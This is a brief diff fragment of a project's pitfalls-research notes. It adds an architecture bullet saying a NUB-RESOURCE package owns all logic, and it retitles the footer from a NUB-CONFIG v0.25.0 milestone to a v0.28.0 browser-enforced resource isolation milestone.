+- `feedback_nub_modular` — confirms NUB-RESOURCE package owns ALL logic; shim/sdk are plugin hosts
 
 ---
 
-*Pitfalls research for: NUB-CONFIG (v0.25.0 milestone)*
-*Researched: 2026-04-17*
+*Pitfalls research for: v0.28.0 Browser-Enforced Resource Isolation*
+*Researched: 2026-04-20*
